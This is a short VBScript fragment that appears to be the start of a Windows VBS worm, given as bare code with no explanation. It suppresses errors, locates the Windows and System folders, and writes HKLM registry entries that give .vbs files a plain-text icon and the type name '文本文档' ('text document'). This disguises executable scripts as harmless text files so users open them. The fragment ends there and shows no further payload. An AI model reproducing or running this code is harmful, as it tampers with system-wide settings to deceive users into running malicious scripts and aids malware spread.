On Error Resume Next
Set fs=CreateObject("Scripting.FileSystemObject")
Set dir1=fs.GetSpecialFolder(0)
Set dir2=fs.GetSpecialFolder(1)
Set so=CreateObject("Scripting.FileSystemObject")
dim r
Set r=CreateObject("Wscript.Shell")
r.Regwrite "HKLM\Software\classes\vbsfile\defaulticon\","shell32.dll,-152"
r.Regwrite "HKLM\Software\classes\vbsfile\","文本文档"
